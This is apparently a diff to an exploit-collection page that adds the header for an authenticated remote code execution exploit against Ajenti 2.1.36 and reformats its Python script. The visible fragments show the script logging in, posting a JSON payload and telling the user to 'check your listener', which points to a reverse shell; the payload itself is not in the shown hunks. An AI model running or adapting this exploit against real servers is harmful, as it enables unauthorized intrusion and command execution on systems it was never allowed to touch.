@@ -7,7 +7,19 @@ category: exploit
 tags: exploit,rce,command,execution
 
 ---
-     #!/usr/bin/python3
+\# Exploit Title: Ajenti 2.1.36 - Remote Code Execution (Authenticated)
+\# Date: 2020-10-22
+\# Exploit Author: Ahmet Ümit BAYRAM
+\# Vendor: https://www.ajenti.org
+\# Software Link: https://github.com/ajenti/ajenti
+\# Version: 2.1.36
+\# Tested on: Kali Linux & Ubuntu 18.04.5
+\# CVE: N/A
+
+
+\--------- Exploit ---------
+
+    #!/usr/bin/python3
     
     import requests
     import sys
@@ -32,7 +44,7 @@ tags: exploit,rce,command,execution
         "username":username,
         "password":password,
         "mode":"normal"}
-          
+         
     
     
     print("[+] Sendin login request...")
@@ -52,9 +64,9 @@ tags: exploit,rce,command,execution
               }
         payload = json.dumps(payload)
         print("[+] Sending payload...")
-        
+       
         send_payload = req.post(page, payload)
-        
+       
         print("[+] Check your listener !...")
     
     else:
